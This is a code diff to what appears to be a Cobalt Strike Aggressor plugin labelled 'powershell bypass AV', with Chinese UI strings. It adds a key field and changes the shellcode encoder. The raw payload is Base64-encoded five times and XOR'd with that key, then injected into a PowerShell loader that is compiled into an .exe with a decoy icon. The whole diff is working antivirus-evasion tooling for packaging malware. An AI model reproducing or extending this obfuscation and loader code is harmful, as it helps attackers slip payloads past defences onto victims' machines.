@@ -5,9 +5,10 @@ popup powershell {
 }
 
 sub dialog_powershell {
-	$info = dialog("powershell bypass AV",%(ps2exe => "ps2exe.ps1",bin => "payload.bin",ico => "tomcat.ico",payload => "payload_cs.ps1",version => "4.0"),&show); 
+	$info = dialog("powershell bypass AV",%(ps2exe => "ps2exe.ps1",bin => "payload.bin",ico => "tomcat.ico",key => "66",payload => "payload_cs.ps1",version => "4.0"),&show); 
 	drow_file($info,"bin","Choose: default payload.bin");
 	drow_file($info,"ico","Choose: 添加ico图标");
+	drow_text($info,"key","输入key值");
 	drow_combobox($info, "version", "Version: ", @("powershell 4.0", "powershell 2.0"));
 	dbutton_action($info,"点击生成！"); # dbutton_action将操作按钮添加到dialog，回调函数
 	dialog_show($info); # 显示文本输入框
@@ -22,38 +23,44 @@ sub payload_bin_to_ps1 {
 	$in = openf($bin_path);
 	$data = readb($in, -1);
 
-	for ($x = 0; $x < strlen($data); $x++)
-	{
-		$shellcode = (byteAt($data, $x) . ",");
-		$char_code = $char_code.$shellcode;
+	for ($i = 0; $i < 5; $i++){
+		$data = [[java.util.Base64 getEncoder] encodeToString: $data];
+		$data = strrep($data, "/", "-");
 	}
-	$char_code = left($char_code, int(strlen($char_code)) - 1);
+	$shell_code = split("",$data);
+	$arr = "";
+	for ($i = 0; $i < size($shell_code); $i++){
+		$arr = $arr . "," .asc($shell_code[$i]) ^ $key;
+	}
+	$arr = right($arr, int(strlen($arr)) - 1);
+	
 	$org_file = $path.'\\powershell_load.ps1';
 	$handle = openf($org_file);
 	while $text (readln($handle)){ 
-		$rep = replace($text, 'acode.*=.*', 'acode='.$char_code)."\n";
-		$new_strs = $new_strs.$rep;
+		$repl = replace($text, 'var_code =.*', 'var_code ='.$arr)."\n";
+		$repl = replace($repl, 'key', $key)."\n";
+		$new_strs = $new_strs.$repl;
 	}
+	
 	$filestring = right($new_strs, int(strlen($new_strs)) - 1);
 	$out =  openf(">$payload_file_ps1");
 	writeb($out, $filestring);
 	closef($out);
 	closef($in);
-	$new_strs = '';
-	$char_code = '';
-	
+	$data = '';
 }
 
 
 sub show {
 	$bin_path = $3["bin"];
+	$key = $3["key"];
 	@array = @("a", "b", "c", "d", "e", "f", "g","h","i");
 	$filename = rand(@array) . rand(@array) . rand(@array);
 	$ico_path = $3["ico"];
 	$payload_file_ps1 = "C:\\windows\\temp\\payload_tmp.ps1";
 	$ps2exe = $path.'\.\\ps2exe.ps1';
 	if (-exists $bin_path && -exists $ico_path) {
-		payload_bin_to_ps1($bin_path,$payload_file_ps1);
+		payload_bin_to_ps1($bin_path,$payload_file_ps1,$key);
 		$version = right($3["version"], 3);
 		$int_version = left($version, 1);
 		prompt_file_save($filename.".exe", {
